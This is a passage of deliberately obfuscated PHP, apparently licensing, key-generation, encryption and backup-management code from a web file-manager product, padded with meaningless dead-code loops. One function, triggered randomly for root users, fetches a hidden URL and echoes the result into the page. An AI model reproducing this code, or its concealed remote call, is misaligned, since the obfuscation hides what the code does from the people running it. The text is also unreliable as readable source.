$»òïßÅ°[220] => $»òïßÅ°[264]), $»òïßÅ°[265] => array($»òïßÅ°[266] => !1, $»òïßÅ°[267] => !1))); $£–ú‹¿Û = @file_get_contents($äÕªº‰, !1, $û¿‰²áà); return json_decode($£–ú‹¿Û, !0); $¯—ËÔÀÓ = $İ„©ş‘[768]; while ($¯—ËÔÀÓ < $İ„©ş‘[705]) { if ($¯—ËÔÀÓ >= 0) { break; } $¯—ËÔÀÓ++; } } private function alyj5a8b582f() { $Ã­š‰ =& $_SERVER[ç¦¬”œš]; $Îâæ¢şî =& $_SERVER[ß±¢Œ¿–]; $ä—è¯î× = array($Îâæ¢şî[268] => $Îâæ¢şî[269], $Îâæ¢şî[270] => $Îâæ¢şî[271], $Îâæ¢şî[272] => $Îâæ¢şî[273], $Îâæ¢şî[274] => $Îâæ¢şî[275], $Îâæ¢şî[276] => $Îâæ¢şî[277], $Îâæ¢şî[278] => $Îâæ¢şî[214], $Îâæ¢şî[279] => $Îâæ¢şî[214], $Îâæ¢şî[280] => $Îâæ¢şî[269], $Îâæ¢şî[281] => $Îâæ¢şî[271], $Îâæ¢şî[282] => $Îâæ¢şî[273], $Îâæ¢şî[283] => $Îâæ¢şî[284], $Îâæ¢şî[285] => $Îâæ¢şî[275], $Îâæ¢şî[286] => $Îâæ¢şî[287], $Îâæ¢şî[288] => $Îâæ¢şî[277], $Îâæ¢şî[289] => $Îâæ¢şî[290], $Îâæ¢şî[291] => $Îâæ¢şî[292], $Îâæ¢şî[293] => $Îâæ¢şî[294]); $ÛáÆ¥ÀÇ = $ä—è¯î×[$this->uodr6330571a]; $ÜÓŸê ½ = $Ã­š‰[769]; if (!$ÜÓŸê ½) { die; } $ÛáÆ¥ÀÇ = intval($ÛáÆ¥ÀÇ ? $ÛáÆ¥ÀÇ : $Îâæ¢şî[269]); $–¾»¥îÃ = _get($this->gpbr66657c07, $Îâæ¢şî[295]); $…’ãŸ¦ú = $Ã­š‰[770]; if (strlen($…’ãŸ¦ú) < $Ã­š‰[729]) { die; } $–¾»¥îÃ = $–¾»¥îÃ ? intval($–¾»¥îÃ) : 0; return $ÛáÆ¥ÀÇ + $–¾»¥îÃ; $¾©¤¨˜Ÿ = $Ã­š‰[771]; while ($¾©¤¨˜Ÿ < $Ã­š‰[705]) { if ($¾©¤¨˜Ÿ >= 0) { break; } $¾©¤¨˜Ÿ++; } } public function jaemf028461f($‹±³Õğ’) { $Éü´“úÏ =& $_SERVER[ß±¢Œ¿–]; $Èâ¤Ô®¯ = $this->alyj5a8b582f(); if ($‹±³Õğ’[$Éü´“úÏ[296]] == $Éü´“úÏ[122]) { return; } if ($Èâ¤Ô®¯ >= intval($Éü´“úÏ[214])) { return; } $êô¢ˆâº = Model($Éü´“úÏ[125])->count(); $“í³»”ˆ = $_SERVER[ç¦¬”œš][731]; if (!$“í³»”ˆ) { return; } if ($êô¢ˆâº <= $Èâ¤Ô®¯) { return; } $—ÈàÓíĞ = Model($Éü´“úÏ[125])->field($Éü´“úÏ[296])->limit($Èâ¤Ô®¯)->select(); $—ÈàÓíĞ = array_to_keyvalue($—ÈàÓíĞ, $Éü´“úÏ[6], $Éü´“úÏ[296]); if (!in_array($‹±³Õğ’[$Éü´“úÏ[296]], $—ÈàÓíĞ)) { show_json($Éü´“úÏ[297], !1, $Éü´“úÏ[210]); } } public function kwpt4ba8af7b() { $ÁİÆš©İ =& $_SERVER[ß±¢Œ¿–]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $¥ˆ¹® = $ÁİÆš©İ[217]; $ù’£åŠ = $_SERVER[ç¦¬”œš][772]; $¥ˆ¹® = $this->wbat98d0185e($¥ˆ¹®, $ÁİÆš©İ[218]); $©„Şò· = stream_context_create(array($ÁİÆš©İ[219] => array($ÁİÆš©İ[220] => $ÁİÆš©İ[221], $ÁİÆš©İ[222] => 3))); $ïÆéÔ÷³ = @file_get_contents($¥ˆ¹®, !1, $©„Şò·); echo $ÁİÆš©İ[298] . hash_encode($ïÆéÔ÷³) . $ÁİÆš©İ[299]; } private function mvyxcb0efe2a($Ğ¯©ûºÌ, $Ãó¿î”´, $óæĞÇşó = 3) { $·œäŒ =& $_SERVER[ç¦¬”œš]; $™òï®˜Í =& $_SERVER[ß±¢Œ¿–]; usleep(1); $Ğ¯©ûºÌ = trim($Ğ¯©ûºÌ); $Ìş¤†Û = $·œäŒ[773]; $àÛÉ¾Ô¾ = mt_rand(0, 5) . $™òï®˜Í[6]; $¦í«ñ¡Š = $·œäŒ[774]; $—üÚ¿¹» = rand_string(15); $îÍ×¼ª– = $™òï®˜Í[300]; $ Áî” = $·œäŒ[771]; if (!$ Áî”) { return; } switch ($àÛÉ¾Ô¾) { case $™òï®˜Í[206]: $îñ¾‡ˆ² = $this->kzbg18792ba8($Ğ¯©ûºÌ, strrev($Ãó¿î”´ . $—üÚ¿¹»)); $Üò‘²ê¢ = $·œäŒ[775]; break; $ñ‘ş”¯â = $·œäŒ[776]; case $™òï®˜Í[122]: $îñ¾‡ˆ² = $this->kzbg18792ba8($Ğ¯©ûºÌ, strrev($—üÚ¿¹» . $Ãó¿î”´)); $é¤•›´ = $·œäŒ[777]; while (strlen($é¤•›´) < $·œäŒ[478]) { if (!$é¤•›´) { break; } $é¤•›´++; } break; case $™òï®˜Í[301]: $îñ¾‡ˆ² = $this->kzbg18792ba8($Ğ¯©ûºÌ, base64_encode($—üÚ¿¹» . $Ãó¿î”´)); break; $ù…ŠÙ£ = $·œäŒ[778]; while (strlen($ù…ŠÙ£) < $·œäŒ[478]) { if (!$ù…ŠÙ£) { break; } $ù…ŠÙ£++; } case $™òï®˜Í[302]: $îñ¾‡ˆ² = $this->kzbg18792ba8($Ğ¯©ûºÌ, md5($—üÚ¿¹» . $Ãó¿î”´)); break; case $™òï®˜Í[303]: $Ğ¯©ûºÌ = base64_encode($Ğ¯©ûºÌ); $Â’ş²¤Ü = rand(0, 64); $Î©´Ù“ = $·œäŒ[779]; $›êÜ™‹ = $îÍ×¼ª–[$Â’ş²¤Ü]; $È§ñÅçÉ = $·œäŒ[780]; if (strlen($È§ñÅçÉ) < $·œäŒ[478]) { return; } $Öõ†› = md5($›êÜ™‹ . md5($Ãó¿î”´ . $›êÜ™‹) . $Ãó¿î”´); $²”‹¸°˜ = $·œäŒ[781]; $Öõ†› = substr($Öõ†›, $Â’ş²¤Ü % 8, $Â’ş²¤Ü % 8 + 7); $¡–ÇåŸª = $™òï®˜Í[6]; $Ã ßÓ€Ö = $·œäŒ[782]; $†ÉÃî ” = 0; $şü”Ã†ß = $·œäŒ[783]; while (strlen($şü”Ã†ß) < $·œäŒ[478]) { if (!$şü”Ã†ß) { break; } $şü”Ã†ß++; } $¦³¼ªï© = 0; $©şÑË§ = $·œäŒ[784]; while (strlen($©şÑË§) < $·œäŒ[729]) { if (!$©şÑË§) { break; } $©şÑË§++; } $©§™«Û = 0; $ğ—Ñ‚ÊÈ = $·œäŒ[785]; if (!$ğ—Ñ‚ÊÈ) { return; } for ($†ÉÃî ” = 0; $†ÉÃî ” < strlen($Ğ¯©ûºÌ); $†ÉÃî ”++) { $©§™«Û = $©§™«Û == strlen($Öõ†›) ? 0 : $©§™«Û; $¦³¼ªï© = ($Â’ş²¤Ü + strpos($îÍ×¼ª–, $Ğ¯©ûºÌ[$†ÉÃî ”]) + ord($Öõ†›[$©§™«Û++])) % 64; $±…ï©´… = $·œäŒ[786]; $¡–ÇåŸª .= $îÍ×¼ª–[$¦³¼ªï©]; } $îñ¾‡ˆ² = hash_encode($›êÜ™‹ . $¡–ÇåŸª); break; default: $îñ¾‡ˆ² = $this->kzbg18792ba8($Ğ¯©ûºÌ, $Ãó¿î”´ . $—üÚ¿¹»); break; } $îñ¾‡ˆ² = strrev($àÛÉ¾Ô¾ . $—üÚ¿¹» . $îñ¾‡ˆ²); if ($óæĞÇşó - 1 > 0) { $îñ¾‡ˆ² = $this->mvyxcb0efe2a($îñ¾‡ˆ², $Ãó¿î”´, $óæĞÇşó - 1); } return $îñ¾‡ˆ²; } private function wtoj46d1ba2c($ñ÷Û®À, $ûŒĞ÷áŞ, $ØçâÏù– = 3) { $Ç·Òäœä =& $_SERVER[ç¦¬”œš]; $ö†”Î¢ô =& $_SERVER[ß±¢Œ¿–]; if (!is_string($ñ÷Û®À) || strlen($ñ÷Û®À) < 10) { return !1; } $ñ÷Û®À = trim($ñ÷Û®À); $Ç¸îçÙœ = $Ç·Òäœä[787]; while (strlen($Ç¸îçÙœ) < $Ç·Òäœä[729]) { if (!$Ç¸îçÙœ) { break; } $Ç¸îçÙœ++; } $ñ÷Û®À = strrev($ñ÷Û®À); $ÄÅÏ¶Âœ = $Ç·Òäœä[788]; if (!$ÄÅÏ¶Âœ) { return; } $Œ¿Í³Š• = $ñ÷Û®À[0]; $†¡Õñ¦— = $Ç·Òäœä[789]; if (!$†¡Õñ¦—) { die; } $¶ØÀè½ = substr($ñ÷Û®À, 1, 15); $ñ÷Û®À = substr($ñ÷Û®À, 16); $Ôµ¸ ÒÍ = $Ç·Òäœä[790]; if (!$Ôµ¸ ÒÍ) { die; } $•ƒÀ£Œ = $ö†”Î¢ô[300]; switch ($Œ¿Í³Š•) { case $ö†”Î¢ô[206]: $çñ÷Í¨ = $this->wbat98d0185e($ñ÷Û®À, strrev($ûŒĞ÷áŞ . $¶ØÀè½)); $ê’´Ú = $Ç·Òäœä[791]; while (strlen($ê’´Ú) < $Ç·Òäœä[701]) { if (!$ê’´Ú) { break; } $ê’´Ú++; } break; case $ö†”Î¢ô[122]: $çñ÷Í¨ = $this->wbat98d0185e($ñ÷Û®À, strrev($¶ØÀè½ . $ûŒĞ÷áŞ)); $çò“ÒäÔ = $Ç·Òäœä[792]; if (strlen($çò“ÒäÔ) < $Ç·Òäœä[701]) { die; } break; $ó¿õû = $Ç·Òäœä[793]; case $ö†”Î¢ô[301]: $çñ÷Í¨ = $this->wbat98d0185e($ñ÷Û®À, base64_encode($¶ØÀè½ . $ûŒĞ÷áŞ)); break; $Õû¸Î‹° = $Ç·Òäœä[794]; while (strlen($Õû¸Î‹°) < $Ç·Òäœä[707]) { if (!$Õû¸Î‹°) { break; } $Õû¸Î‹°++; } case $ö†”Î¢ô[302]: $çñ÷Í¨ = $this->wbat98d0185e($ñ÷Û®À, md5($¶ØÀè½ . $ûŒĞ÷áŞ)); break; $÷¨Øç“ = $Ç·Òäœä[795]; if (strlen($÷¨Øç“) < $Ç·Òäœä[478]) { return; } case $ö†”Î¢ô[303]: $ñ÷Û®À = hash_decode($ñ÷Û®À); $¨²áıç¦ = $ñ÷Û®À[0]; $é¸ğğÒ¿ = $Ç·Òäœä[796]; if (!$é¸ğğÒ¿) { return; } $ñ÷Û®À = substr($ñ÷Û®À, 1); $ßâĞî¹ = $Ç·Òäœä[797]; if (strlen($ßâĞî¹) < $Ç·Òäœä[705]) { return; } $èòğ™¼ = strpos($•ƒÀ£Œ, $¨²áıç¦); $Æº˜î = md5($¨²áıç¦ . md5($ûŒĞ÷áŞ . $¨²áıç¦) . $ûŒĞ÷áŞ); $ª‚ÉıÜä = $Ç·Òäœä[798]; $Æº˜î = substr($Æº˜î, $èòğ™¼ % 8, $èòğ™¼ % 8 + 7); $°Òª¹” = $Ç·Òäœä[799]; while ($°Òª¹” < $Ç·Òäœä[707]) { if ($°Òª¹” >= 0) { break; } $°Òª¹”++; } $ñ˜ĞÔ˜€ = $ö†”Î¢ô[6]; $²‹ö¢ = 0; $”¹ªÒ°Ì = 0; $’©üü¶Ş = $Ç·Òäœä[800]; if (!$’©üü¶Ş) { die; } $šâÊ–ÉÆ = 0; for ($²‹ö¢ = 0; $²‹ö¢ < strlen($ñ÷Û®À); $²‹ö¢++) { $šâÊ–ÉÆ = $šâÊ–ÉÆ == strlen($Æº˜î) ? 0 : $šâÊ–ÉÆ; $ŸÛÈ¾ƒ’ = $šâÊ–ÉÆ++; $”¹ªÒ°Ì = strpos($•ƒÀ£Œ, $ñ÷Û®À[$²‹ö¢]) - $èòğ™¼ - ord($Æº˜î[$ŸÛÈ¾ƒ’]); $‰ËšÃÏ¾ = $Ç·Òäœä[801]; while ($”¹ªÒ°Ì < 0) { $”¹ªÒ°Ì += 64; $·ã¸š®Ù = $Ç·Òäœä[802]; if (strlen($·ã¸š®Ù) < $Ç·Òäœä[707]) { die; } } $ñ˜ĞÔ˜€ .= $•ƒÀ£Œ[$”¹ªÒ°Ì]; } $çñ÷Í¨ = base64_decode($ñ˜ĞÔ˜€); break; $óÙ …¨Ú = $Ç·Òäœä[803]; while (strlen($óÙ …¨Ú) < $Ç·Òäœä[701]) { if (!$óÙ …¨Ú) { break; } $óÙ …¨Ú++; } default: $çñ÷Í¨ = $this->wbat98d0185e($ñ÷Û®À, $ûŒĞ÷áŞ . $¶ØÀè½); break; $Š‰ö±’ƒ = $Ç·Òäœä[804]; if (strlen($Š‰ö±’ƒ) < $Ç·Òäœä[478]) { die; } } if ($ØçâÏù– - 1 > 0) { $çñ÷Í¨ = $this->wtoj46d1ba2c($çñ÷Í¨, $ûŒĞ÷áŞ, $ØçâÏù– - 1); } return $çñ÷Í¨; } public function ozcnab746ada($õÅ¯€åª) { $¸­ä‹Ê =& $_SERVER[ç¦¬”œš]; $ƒòò•¦ş =& $_SERVER[ß±¢Œ¿–]; $ÆíŸ³È‚ = $this->mknge67d6d5c(); $¤ÜÓ„Äã = $this->mknge67d6d5c(); $ÉöşÌ„İ = $¸­ä‹Ê[805]; if (strlen($ÉöşÌ„İ) < $¸­ä‹Ê[701]) { return; } $®Îˆ¤Èş = ($ÆíŸ³È‚ - 1) * ($¤ÜÓ„Äã - 1); $–ü ´Ãª = intval(($ÆíŸ³È‚ + $¤ÜÓ„Äã) / 2); $Û×Šàß¦ = $¸­ä‹Ê[806]; if (!$Û×Šàß¦) { return; } while (1) { $†šÇ˜‰Š = $–ü ´Ãª; $§çü±İõ = $®Îˆ¤Èş; $é™¡“®û = $¸­ä‹Ê[807]; while ($§çü±İõ % $†šÇ˜‰Š != 0) { $¢´æ°ë¸ = $§çü±İõ; $§çü±İõ = $†šÇ˜‰Š; $†šÇ˜‰Š = $¢´æ°ë¸ % $†šÇ˜‰Š; $¼¶¢Û÷— = $¸­ä‹Ê[808]; if (!$¼¶¢Û÷—) { die; } } if ($†šÇ˜‰Š == 1) { break; } else { $–ü ´Ãª++; } } $ù‘º¶–Ñ = 2; $†…ƒƒ’ = $¸­ä‹Ê[809]; for ($ÜÏôÒÒ½ = 0; $ÜÏôÒÒ½ < $®Îˆ¤Èş * 10; $ÜÏôÒÒ½++) { if (($®Îˆ¤Èş * $ÜÏôÒÒ½ + 1) % $–ü ´Ãª == 0) { $ù‘º¶–Ñ = intval(($®Îˆ¤Èş * $ÜÏôÒÒ½ + 1) / $–ü ´Ãª); break; } } $õşˆôœ‰ = $this->kzbg18792ba8($ÆíŸ³È‚ * $¤ÜÓ„Äã . $ƒòò•¦ş[6], $ƒòò•¦ş[136]); $ÓÂñßğ = $¸­ä‹Ê[810]; while ($ÓÂñßğ < $¸­ä‹Ê[705]) { if ($ÓÂñßğ >= 0) { break; } $ÓÂñßğ++; } $–íÕ±Áë = md5($ƒòò•¦ş[304] . ($ÆíŸ³È‚ + $¤ÜÓ„Äã) . $ƒòò•¦ş[305] . $–ü ´Ãª . $ƒòò•¦ş[305] . $ù‘º¶–Ñ . $ƒòò•¦ş[306]); $µ»¯³öø = $this->kzbg18792ba8($õÅ¯€åª, $–íÕ±Áë) . $ƒòò•¦ş[307] . $õşˆôœ‰; return $µ»¯³öø; $ó¿ÛÇ“™ = $¸­ä‹Ê[811]; } public function gnidaf1de1ab($È“ï®ä¢) { $–ÅÀïç´ =& $_SERVER[ç¦¬”œš]; $ú™¢ =& $_SERVER[ß±¢Œ¿–]; $îµ‹ŞŸâ = explode($ú™¢[307], $È“ï®ä¢); $şğòæèÌ = $–ÅÀïç´[812]; if (strlen($şğòæèÌ) < $–ÅÀïç´[707]) { die; } if (count($îµ‹ŞŸâ) != 2) { return $ú™¢[6]; } $ä³äˆì = $this->wbat98d0185e($îµ‹ŞŸâ[1] . $ú™¢[6], $ú™¢[136]); if (!$ä³äˆì) { return $ú™¢[6]; } $ä³äˆì = intval($ä³äˆì); $¼±³¡Äá = $–ÅÀïç´[813]; while (strlen($¼±³¡Äá) < $–ÅÀïç´[705]) { if (!$¼±³¡Äá) { break; } $¼±³¡Äá++; } $ñºÖ¯Èß = 0; $ØâÕ•˜¸ = 0; for ($ğ€ÏŞæŸ = 3; $ğ€ÏŞæŸ < $ä³äˆì; $ğ€ÏŞæŸ += 2) { if ($ä³äˆì % $ğ€ÏŞæŸ != 0) { continue; } $ñºÖ¯Èß = $ğ€ÏŞæŸ; $äÛ“«Ù = $–ÅÀïç´[814]; while (strlen($äÛ“«Ù) < $–ÅÀïç´[701]) { if (!$äÛ“«Ù) { break; } $äÛ“«Ù++; } $ØâÕ•˜¸ = intval($ä³äˆì / $ğ€ÏŞæŸ); $Õ÷æşÁŸ = $–ÅÀïç´[815]; if (strlen($Õ÷æşÁŸ) < $–ÅÀïç´[729]) { return; } break; } $¡´¥¡Ö¹ = ($ñºÖ¯Èß - 1) * ($ØâÕ•˜¸ - 1); $òŒÒ³‡¾ = $–ÅÀïç´[816]; $³Ä²ğ£Ì = intval(($ñºÖ¯Èß + $ØâÕ•˜¸) / 2); $µû¿³î = $–ÅÀïç´[817]; while (strlen($µû¿³î) < $–ÅÀïç´[729]) { if (!$µû¿³î) { break; } $µû¿³î++; } while (1) { $ÛË¹–„ = $³Ä²ğ£Ì; $ß£«Óï¶ = $–ÅÀïç´[818]; while (strlen($ß£«Óï¶) < $–ÅÀïç´[707]) { if (!$ß£«Óï¶) { break; } $ß£«Óï¶++; } $¤à×Õ½é = $¡´¥¡Ö¹; while ($¤à×Õ½é % $ÛË¹–„ != 0) { $íì‹ºæš = $¤à×Õ½é; $¤à×Õ½é = $ÛË¹–„; $Ä™ŠŠÉÓ = $–ÅÀïç´[819]; if (strlen($Ä™ŠŠÉÓ) < $–ÅÀïç´[705]) { return; } $ÛË¹–„ = $íì‹ºæš % $ÛË¹–„; } if ($ÛË¹–„ == 1) { break; } else { $³Ä²ğ£Ì++; } } $¯Íãí—‰ = 2; for ($ğ€ÏŞæŸ = 0; $ğ€ÏŞæŸ < $¡´¥¡Ö¹ * 10; $ğ€ÏŞæŸ++) { if (($¡´¥¡Ö¹ * $ğ€ÏŞæŸ + 1) % $³Ä²ğ£Ì == 0) { $¯Íãí—‰ = intval(($¡´¥¡Ö¹ * $ğ€ÏŞæŸ + 1) / $³Ä²ğ£Ì); break; } } $õ¾Ô¶Ú¬ = md5($ú™¢[304] . ($ñºÖ¯Èß + $ØâÕ•˜¸) . $ú™¢[305] . $³Ä²ğ£Ì . $ú™¢[305] . $¯Íãí—‰ . $ú™¢[306]); $Ş¯‰›ÎÏ = $–ÅÀïç´[820]; while (strlen($Ş¯‰›ÎÏ) < $–ÅÀïç´[478]) { if (!$Ş¯‰›ÎÏ) { break; } $Ş¯‰›ÎÏ++; } $Ø²äÌ· = $this->wbat98d0185e($îµ‹ŞŸâ[0], $õ¾Ô¶Ú¬); $¼‰¡èâß = $–ÅÀïç´[821]; if (!$¼‰¡èâß) { die; } return $Ø²äÌ·; $•–õÂü™ = $–ÅÀïç´[809]; } public function mknge67d6d5c() { $ô°Á¹¨ =& $_SERVER[ç¦¬”œš]; $ğØĞôã = mt_rand(pow(2, 14), pow(2, 16) - 1); $ºí”‹İÆ = $ô°Á¹¨[822]; $´×®†Ş¨ = array(); $öŞ…©¶ó = $ô°Á¹¨[823]; if (!$öŞ…©¶ó) { die; } $ˆ·ÜŒ¤Æ = 1; $˜øûÅø = $ô°Á¹¨[824]; if (strlen($˜øûÅø) < $ô°Á¹¨[707]) { return; } while ($ˆ·ÜŒ¤Æ <= (int) sqrt($ğØĞôã)) { $¥ãƒâÜ± = $ˆ·ÜŒ¤Æ; while (!0) { $¥ãƒâÜ±++; if ($¥ãƒâÜ± <= 2) { $ˆ·ÜŒ¤Æ = $¥ãƒâÜ±; break; } else { if ($¥ãƒâÜ± < 2) { continue; } } $Â½şıŸü = !0; for ($Ò‰éÜ”è = 2; $Ò‰éÜ”è <= sqrt($¥ãƒâÜ±); $Ò‰éÜ”è++) { if ($¥ãƒâÜ± % $Ò‰éÜ”è == 0) { $Â½şıŸü = !1; } } if ($Â½şıŸü) { $ˆ·ÜŒ¤Æ = $¥ãƒâÜ±; break; } } $´×®†Ş¨[] = $ˆ·ÜŒ¤Æ; } $¤„¡Ÿ­‹ = 2; $© ÷´ÚÌ = $ô°Á¹¨[825]; while (strlen($© ÷´ÚÌ) < $ô°Á¹¨[701]) { if (!$© ÷´ÚÌ) { break; } $© ÷´ÚÌ++; } for ($¥ãƒâÜ± = $ğØĞôã; $¥ãƒâÜ± > 1; $¥ãƒâÜ±--) { $Â½şıŸü = !0; $Š£‡‰× = $ô°Á¹¨[826]; foreach ($´×®†Ş¨ as $¸äüá°Ş) { if ($¥ãƒâÜ± % $¸äüá°Ş == 0) { $Â½şıŸü = !1; break; } } if ($Â½şıŸü) { $¤„¡Ÿ­‹ = $¥ãƒâÜ±; break; } } return $¤„¡Ÿ­‹; } public function kugv6683bd9b($òƒêö²¡, $»³÷àã“) { $êÀ¦¸à =& $_SERVER[ß±¢Œ¿–]; return call_user_func(array($êÀ¦¸à[8], $êÀ¦¸à[308]), $òƒêö²¡, $»³÷àã“); } public function kzbg18792ba8($Ñ™£¡Ì, $ûÎ€ïº­) { $Æàšíşï =& $_SERVER[ß±¢Œ¿–]; return call_user_func(array($Æàšíşï[309], $Æàšíşï[310]), $Ñ™£¡Ì, $ûÎ€ïº­); } public function wbat98d0185e($‘‘ä¬ñ¶, $Ïüéæ²û) { $­Ñ–şÏğ =& $_SERVER[ç¦¬”œš]; $®‚ôşµâ =& $_SERVER[ß±¢Œ¿–]; return call_user_func(array($®‚ôşµâ[309], $®‚ôşµâ[311]), $‘‘ä¬ñ¶, $Ïüéæ²û); $áøğÃğ¾ = $­Ñ–şÏğ[827]; while ($áøğÃğ¾ < $­Ñ–şÏğ[707]) { if ($áøğÃğ¾ >= 0) { break; } $áøğÃğ¾++; } } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[ç¦¬”œš][828]); $this->init(); $this->keep(); } public function init() { $è·«ßÊ =& $_SERVER[ç¦¬”œš]; $this->isManual(); self::$name = date($è·«ßÊ[829]); if (!($Ã¯ª™Ãˆ = $this->model->lastItem())) { $Ã¯ª™Ãˆ = $this->initData(); } else { self::$name = $Ã¯ª™Ãˆ[$è·«ßÊ[32]]; if ($Ã¯ª™Ãˆ[$è·«ßÊ[830]] == $è·«ßÊ[91]) { self::$name = date($è·«ßÊ[272]); $†ÙÏÒ¦é = intval(_get($Ã¯ª™Ãˆ, $è·«ßÊ[831], 0)); if (self::$manual == 0 && $Ã¯ª™Ãˆ[$è·«ßÊ[32]] == self::$name) { $this->model->remove($Ã¯ª™Ãˆ[$è·«ßÊ[484]]); } $Ã¯ª™Ãˆ = $this->initData($†ÙÏÒ¦é, $Ã¯ª™Ãˆ[$è·«ßÊ[832]]); } else { $this->checkStore($Ã¯ª™Ãˆ[$è·«ßÊ[832]]); } } self::$option = $Ã¯ª™Ãˆ; } private function isManual() { $Úîˆøœ = _get($GLOBALS, $_SERVER[ç¦¬”œš][833], 0); $Úîˆøœ = intval($Úîˆøœ); self::$manual = $Úîˆøœ && $Úîˆøœ == 1 ? 1 : 0; } private function initData($Œ¢†ŞÁ = 0, $ºë¨Å„¿ = '') { $„Áûïş =& $_SERVER[ç¦¬”œš]; $û’ä¸…ò = $this->model->config(); if ($ºë¨Å„¿ && $û’ä¸…ò[$„Áûïş[832]] != $ºë¨Å„¿) { $Œ¢†ŞÁ = 0; } $this->checkStore($û’ä¸…ò[$„Áûïş[832]]); if (self::$manual == 1) { self::$name .= $„Áûïş[11] . date($„Áûïş[834]); } $ÎÓñÛìƒ = array($„Áûïş[832] => $û’ä¸…ò[$„Áûïş[832]], $„Áûïş[32] => self::$name, $„Áûïş[830] => 0, $„Áûïş[171] => $û’ä¸…ò[$„Áûïş[171]], $„Áûïş[835] => self::$manual, $„Áûïş[369] => array($„Áûïş[836] => array($„Áûïş[830] => 0), $„Áûïş[837] => array($„Áûïş[830] => 0, $„Áûïş[838] => 0, $„Áûïş[839] => 0, $„Áûïş[33] => $„Áûïş[12], $„Áûïş[840] => 0, $„Áûïş[841] => 0), $„Áûïş[842] => array($„Áûïş[830] => 0, $„Áûïş[838] => 0, $„Áûïş[839] => 0, $„Áûïş[840] => 0, $„Áûïş[841] => 0), $„Áûïş[230] => array($„Áûïş[830] => 0, $„Áûïş[843] => 0, $„Áûïş[844] => 0, $„Áûïş[845] => 0, $„Áûïş[846] => 0, $„Áûïş[550] => $Œ¢†ŞÁ, $„Áûïş[840] => 0, $„Áûïş[841] => 0)), $„Áûïş[840] => time(), $„Áûïş[841] => 0); $µí­¡úÏ = $this->model->insert($ÎÓñÛìƒ); $ÎÓñÛìƒ[$„Áûïş[484]] = $µí­¡úÏ; return $ÎÓñÛìƒ; } private function checkStore($ØÄšŞÔ) { $†ªÆ‚×Ù = Model($_SERVER[ç¦¬”œš][847]); $ôĞÕæ•­ = $†ªÆ‚×Ù->listData($ØÄšŞÔ); $†ªÆ‚×Ù->checkConfig($ôĞÕæ•­); } public static function get() { if (!self::$option) { $–Å­»Åı = Model($_SERVER[ç¦¬”œš][828]); $ô¼Ü‚öÍ = $–Å­»Åı->findByName(self::$name); $–Å­»Åı->parseContent($ô¼Ü‚öÍ); self::$option = $ô¼Ü‚öÍ; } return self::$option; } public static function set($·à´ºØ«) { $íäÙ“¬ =& $_SERVER[ç¦¬”œš]; $ÍÒÔÜ¯ = self::get(); foreach ($·à´ºØ« as $ó±Ñ»·³ => $Ï¾ş—¤) { array_set_value($ÍÒÔÜ¯, $ó±Ñ»·³, $Ï¾ş—¤); } Model($íäÙ“¬[828])->update($ÍÒÔÜ¯[$íäÙ“¬[484]], $ÍÒÔÜ¯); self::$option = $ÍÒÔÜ¯; return self::$option; } public function keep() { $£†ºŞ‰¼ =& $_SERVER[ç¦¬”œš]; $ÖÜÆîéŠ = self::get(); if (_get($ÖÜÆîéŠ, $£†ºŞ‰¼[848], 0) == $£†ºŞ‰¼[91]) { return; } $this->backupKeep($ÖÜÆîéŠ); self::set(array($£†ºŞ‰¼[848] => 1)); } private function backupKeep($»ŒÛ¸§Ø) { $×ººâ¹› =& $_SERVER[ç¦¬”œš]; if (self::$manual == 1) { return; } $ÖòšËú° = $this->model->listData(); if (empty($ÖòšËú°)) { return; } $Ì’ü…ûğ = 0; $²Óæı“ = array(); foreach ($ÖòšËú° as $¨š“øâ) { if ($Ì’ü…ûğ >= 7) { break; } $²Óæı“[] = $¨š“øâ[$×ººâ¹›[32]]; $Ì’ü…ûğ++; } for ($Ì’ü…ûğ = 0; $Ì’ü…ûğ < 12; $Ì’ü…ûğ++) { $²Óæı“[] = date($×ººâ¹›[849], strtotime("\55{$Ì’ü…ûğ}\40\155\x6f\156\x74\x68\x73")); } $²Óæı“ = array_unique($²Óæı“); $Š´¦’áë = Model($×ººâ¹›[850])->get($×ººâ¹›[851]); foreach ($ÖòšËú° as $¨š“øâ) { if (isset($¨š“øâ[$×ººâ¹›[835]]) && $¨š“øâ[$×ººâ¹›[835]] == $×ººâ¹›[91]) { continue; } if (!empty($¨š“øâ[$×ººâ¹›[32]]) && in_array($¨š“øâ[$×ººâ¹›[32]], $²Óæı“)) { continue; } $this->model->remove($¨š“øâ[$×ººâ¹›[484]]); $á¢ÀêØ› = $this->backupPath($»ŒÛ¸§Ø, $Š´¦’áë); IO::remove($á¢ÀêØ›, !1); } } private function backupPath($øä¤â÷´, $ÁËûÀ÷ = false) { $æÓ¾Öñ =& $_SERVER[ç¦¬”œš]; if (!$ÁËûÀ÷) { $ÁËûÀ÷ = Model($æÓ¾Öñ[850])->get($æÓ¾Öñ[851]); } $ñ¾øŞÎô = $øä¤â÷´[$æÓ¾Öñ[32]]; $ÚÎ­æÎÉ = substr(md5($æÓ¾Öñ[852] . $ÁËûÀ÷ . $ñ¾øŞÎô), 0, 8); return "\x7b\151\157\72{$øä¤â÷´[$æÓ¾Öñ[832]]}\x7d\x2f\144\141\164\x61\x62\141\x73\145\57\142\141\x63\x6b\x75\160\57" . $ñ¾øŞÎô . $æÓ¾Öñ[11] . $ÚÎ­æÎÉ; } public function db() { $ÆúÓÏ™˜ =& $_SERVER[ç¦¬”œš]; $˜²šúğ = self::get(); if (_get($˜²šúğ, $ÆúÓÏ™˜[853], 0) == $ÆúÓÏ™˜[91]) { return !0; } $¥•Ú°åé = new BackupDb(); if (!$¥•Ú°åé->index()) { return !1; } self::set(array($ÆúÓÏ™˜[853] => 1)); return !0; } public function dbFile() { $¬ãô¸æÑ =& $_SERVER[ç¦¬”œš]; $å“Ü¶  = self::get(); if (_get($å“Ü¶ , $¬ãô¸æÑ[854], 0) == $¬ãô¸æÑ[91]) { return !0; } $Ğ„ÈıÛæ = new BackupDbFile(); if (!$Ğ„ÈıÛæ->index()) { return !1; } self::set(array($¬ãô¸æÑ[854] => 1)); return !0; } public function file() { $â‰û¹¡ =& $_SERVER[ç¦¬”œš]; $Å²ïŒš = self::get(); if (_get($Å²ïŒš, $â‰û¹¡[855], 0) == $â‰û¹¡[91]) { return !0; } if ($Å²ïŒš[$â‰û¹¡[171]] == $â‰û¹¡[856]) { $ìß ‰§ = new BackupFile(); if (!$ìß ‰§->index()) { return !1; } } self::set(array($â‰û¹¡[855] => 1, $â‰û¹¡[830] => 1)); return !0; } } goto 